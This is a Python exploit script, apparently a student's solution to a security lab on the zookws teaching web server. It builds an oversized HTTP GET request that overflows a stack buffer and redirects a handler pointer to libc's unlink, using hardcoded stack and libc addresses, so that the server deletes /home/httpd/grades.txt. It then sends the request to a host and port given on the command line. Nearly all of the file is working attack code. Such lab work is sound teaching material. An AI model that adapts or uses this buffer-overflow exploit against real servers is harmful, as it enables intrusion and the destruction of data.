#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0xbfffd9fc
stack_saved_ebp = 0xbfffde08
stack_retaddr = stack_saved_ebp + 4
stack_arg1 = stack_retaddr + 4
stack_arg2 = stack_arg1 + 4

## original handler value
handler_value = 0x080495ea
## original ebp value
ebp_value = 0xbffffe48
## original return address
ret_value = 0x80488d86
## pointer to str "/home/httpd/grades.txt" in shellcode
file_path = 0xbfffda2c 

## libc function address
unlink_addr = 0x40102450
system_addr = 0x40065100
exit_addr = 0x40058150

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)

	## does not corrupt the return address of http_serve(),
	## corrupt the handler instead.

    req =   "GET /"
    req += create_n_str(1013-len(req))
#    req += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    req += struct.pack("<I", unlink_addr)       # handler_value
    req += create_n_str(12)
#    req += "\x0c\xda\xff\xbf"                  # ebp
    req += struct.pack("<I", exit_addr)         # ret = unlink
    req += struct.pack("<I", stack_arg2)        # point to the str
    req += "/home/httpd/grades.txt"
    req += " HTTP/1.0\r\n" + \
            "\r\n"

    print("req:"+req)
    return req

####
def create_n_str(n):
    i = 0
    str = ""
    while (i < n):
        str += "x"
        i += 1

    return str

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

